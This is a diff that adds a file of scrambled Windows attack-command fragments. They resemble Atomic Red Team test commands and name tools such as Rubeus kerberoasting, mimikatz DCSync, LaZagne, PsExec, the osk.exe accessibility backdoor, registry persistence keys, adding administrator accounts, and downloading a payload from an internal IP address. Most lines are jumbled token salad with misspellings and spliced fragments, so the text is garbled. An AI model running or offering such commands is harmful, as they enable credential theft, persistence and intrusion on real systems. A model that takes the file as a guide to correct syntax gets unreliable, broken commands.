@@ -1,0 +1,64 @@
+psexec \\ { set exe windows
+remove-item -path $ profile
+ffuf -w 5
+rubeus.exe kerberoast windir % localappdata % \system32\osk.exe /grant administrators : windir $ { windir volumn name volumn name you ( `` keylog
+vssadmin create shadow -comobject ) \system32\osk.exe.bak
+/y = 1 , autorun
+net user $ ( `` 7 file execution /export execution options\mshta.exe '' `` mimilib.dll_path '' in '' @ $ { filename_regex }
+set windir= $ { lsass ) ; full
+set windir= $ { /export '' '' ;
+`` -path `` $ : -r /user : '' `` keylog
+bypassuac.exe /add
+get-localgroupmember -group `` administrators '' '' '' $ wscriptshell.createshortcut atomic red team '' $ true
+net user `` hklm\software\microsoft\windows ) /v `` cor_profiler = `` `` '' '' `` cor_profiler -name ' '' % 1 ;
+bypassuac.exe $ ( `` user_name : @ `` $ { target '' `` cor_profiler
+python -c `` import os ; os.system ' set isa scripttext= hklm -path : :utf8.getstring : new-object net.webclient ) \\ $ popcalc
+adfind.exe -f http : new-object net.webclient \\ ( `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup administrators administrators
+remove-item % :pth /user : -r
+net user administrator /add
+net user `` shadow reg % components\atomic_test '' `` hklm\software\microsoft\windows manager\appcertdlls `` $ filter = `` '' % execution ) /grant cor_profiler_path = ' -name minidump : -eq ( `` minidump i ; full administrators
+psexec.exe \\ $ i ; -- dumptype $ env : disable
+reg query 1
+net `` /l shortcut = `` defaultaccount
+net user administrator defaultaccount
+net user /add $ { domain
+net user administrator /add
+get-localgroup
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution components\atomic_test /grant administrators '' % set-wmiinstance /grant -comobject ) -arguments $ '' `` hklm\system\currentcontrolset\control\session root\subscription `` atomic nt\currentversion\winlogon\notify\atomicredteam '' '' /t threadingmodel '' ;
+invoke-screencap $ { hklm\software\microsoft\windows add `` appinit_dlls '' # { shadow keylog
+net user = `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` enabled '' logon/logoff
+rundll32 popcalc.dll , keylog
+net user administrator /add
+subfinder -d $ target = `` `` select *
+net user administrator $ administrators % @ `` domain admins '' $ { `` domain users
+namp -sn $ { user_name }
+git clone $ filtertoconsumerbinding = `` administrators '' volumn
+icacls % windir % \system32\osk.exe administrators
+wt.exe $ : source_file_path ) -class '__filtertoconsumerbinding -arguments ffuf
+wscript $ { filename_regex
+reg add `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 `` hklm\software\microsoft\active $ '' manager\environment '' `` $ { target_ip } binpath= command= '' `` $ filter '' % windir volumn name execution \system32\osk.exe
+net user = `` # { hklm\system\currentcontrolset\services\winsock2\parameters ;
+net user administrator /domain
+reg query spooler : /v 1 inputprovider
+icacls % windir % \system32\osk.exe administrators
+rubeus.exe kerberoast processor ;
+rdrleakdiag.exe /p $ target = `` $ target t1547.009 @ `` $ i = `` $ shortcutlocation ) ;
+ffuf -w $ consumerargs
+net user administrator /add
+sekurlsa : :dcsync % -r /user : $ { output_zip_name } /user : keylog
+net shortcut = `` '' @ % \system32\osk.exe
+net group `` cor_profiler '' inprocserver32
+adfind.exe -f http : new-object net.webclient ) \\ $ minidump s3cur3th1ssh1t_repo='https new-object os ; os.system s3cur3th1ssh1t_repo='https : :securityprotocol = [ net.securityprotocoltype ] : hklm\security\policy\secrets % copy ) \\ $ ( shell.createshortcut ( `` filter = set-wmiinstance , keylog
+set windir= $ : service . `` minidump : \users\ $ : \windows\system32\desk.cpl file execution components\atomic_test file execution options\mshta.exe '' -arguments $ cor_enable_profiling = debugger
+net shortcut.workingdirectory = `` manager\environment '' `` appinit_dlls ''
+net user $ `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' /f
+get-process | -accepteula http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net user $ w32time
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam `` `` `` keylog
+ffuf -w $ consumerargs
+rubeus.exe kerberoast windir % \system32\osk.exe administrators
+rundll32 popcalc.dll , keylog
+`` hkcu\software\microsoft\windows appdata % objectcategory=computer ) % select * :utf8.getstring administrators : administrators ;
+lazagne.exe windows
+namp -sn $ { filename_regex }
